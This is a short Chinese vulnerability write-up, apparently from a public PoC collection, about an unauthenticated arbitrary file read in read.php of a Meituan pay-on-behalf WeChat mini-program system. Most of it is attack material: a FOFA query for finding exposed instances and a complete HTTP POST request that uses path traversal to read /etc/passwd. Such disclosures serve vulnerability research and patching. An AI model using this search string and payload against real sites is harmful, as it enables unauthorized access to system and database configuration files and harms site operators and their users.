# 美团代付微信小程序系统read.php任意文件读取漏洞

美团代付微信小程序系统 read.php 接口存在任意文件读取漏洞，未经身份验证攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致网站处于极度不安全状态。

## fofa

```javascript
body="/h5/static/js/chunk-vendors.js"
```

## poc

```javascript
POST /static/ueditor22/_test/tools/br/read.php HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

name=../../../../../../../../../etc/passwd
```

![image-20241114142630011](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202411141426075.png)